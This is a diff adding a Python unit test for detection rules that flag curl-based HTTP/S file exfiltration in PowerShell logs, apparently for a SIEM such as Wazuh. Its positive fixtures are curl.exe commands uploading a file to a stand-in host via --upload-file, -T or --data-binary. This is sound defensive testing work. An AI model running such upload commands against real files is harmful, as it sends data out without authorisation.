@@ -278,6 +278,69 @@ class RuleHardeningTests(unittest.TestCase):
         )
         self.assertGreater(int(high.attrib["level"]), int(rules["100532"].attrib["level"]))
 
+    def test_powershell_curl_upload_is_bound_to_one_command_segment(self) -> None:
+        """Rules 100532/100547: curl, the upload option and the HTTP/S destination must
+        share one command segment, and the transfer-reset option is a boundary only when
+        it appears as a complete token."""
+        rules = load_rules("http_exfiltration_detection.xml")
+        patterns = {
+            rule_id: re.compile(field_pattern(rules[rule_id], "win.eventdata.scriptBlockText"))
+            for rule_id in ("100532", "100547")
+        }
+
+        # Same-segment uploads that must keep matching, including a transfer reset that
+        # follows a complete upload, and source paths that merely contain the option text.
+        positives = [
+            'curl.exe --upload-file $p https://host/upload --next https://host/health',
+            'curl.exe https://host/health --next --upload-file $p https://host/upload',
+            r'curl.exe --upload-file "C:\Temp\--next-backup.txt" https://host/upload',
+            r'curl.exe --data-binary "@C:\Temp\--next-backup.txt" https://host/upload',
+            r'curl.exe -T "C:\Temp\--next-backup.txt" https://host/upload',
+            r"curl.exe --upload-file 'C:\Temp\report--next.zip' https://host/upload",
+        ]
+
+        # Separator placed between the upload option and an unrelated URL.
+        option_to_url_negatives = [
+            'curl.exe --upload-file $p ftp://ftp.example/upload;Invoke-WebRequest -Uri https://host/health -Method Get',
+            'curl.exe --upload-file $p ftp://ftp.example/upload && Invoke-WebRequest -Uri https://host/health -Method Get',
+            'curl.exe --upload-file $p ftp://ftp.example/upload || Invoke-WebRequest -Uri https://host/health -Method Get',
+            'curl.exe --upload-file $p ftp://ftp.example/upload | Invoke-WebRequest -Uri https://host/health -Method Get',
+            'curl.exe --upload-file $p ftp://ftp.example/upload\r\nInvoke-WebRequest -Uri https://host/health -Method Get',
+        ]
+
+        # Separator placed between the curl invocation and a later command that carries
+        # both the upload syntax and the URL. This placement is what previously leaked.
+        curl_to_command_negatives = [
+            "curl.exe --version && Write-Output '--upload-file $p https://host/upload'",
+            "curl.exe --version || Write-Output '--upload-file $p https://host/upload'",
+            "curl.exe --version | Write-Output '--upload-file $p https://host/upload'",
+            'curl.exe --version && tool.exe --upload-file $p https://host/upload',
+            "curl.exe --version; Write-Output '--upload-file $p https://host/upload'",
+            'curl.exe --version\r\ntool.exe --upload-file $p https://host/upload',
+            "curl.exe --version | ForEach-Object { tool.exe -T $p https://host/upload }",
+            "curl.exe --version && tool.exe --data-binary @$p https://host/upload",
+        ]
+
+        # A real transfer reset must still stop the upload option and the HTTP/S
+        # destination from being borrowed across curl transfers.
+        cross_transfer_negatives = [
+            'curl.exe --upload-file $p ftp://ftp.example/upload --next https://host/health',
+            'curl.exe -T $p ftp://ftp.example/upload --next https://host/health',
+            'curl.exe --data-binary @$p ftp://ftp.example/upload --next https://host/health',
+            'curl.exe --upload-file $p ftp://ftp.example/upload --next --upload-file $q ftp://ftp.example/b --next https://host/health',
+        ]
+
+        for rule_id, pattern in patterns.items():
+            for script in positives:
+                self.assertIsNotNone(pattern.search(script), f"{rule_id} missed {script!r}")
+            for script in option_to_url_negatives + curl_to_command_negatives + cross_transfer_negatives:
+                self.assertIsNone(pattern.search(script), f"{rule_id} matched {script!r}")
+
+        # The transfer-reset boundary must be a complete option token, never a substring.
+        for pattern in patterns.values():
+            self.assertNotIn("(?!--next|", pattern.pattern)
+            self.assertIn(r"(?!\s--next(?:\s|$)|", pattern.pattern)
+
     def test_dns_encoded_label_and_burst_layers_generalize_transport(self) -> None:
         rules = load_rules("dns_exfiltration_detection.xml")
         self.assertEqual(child_text(rules["100533"], "if_sid"), "60009")
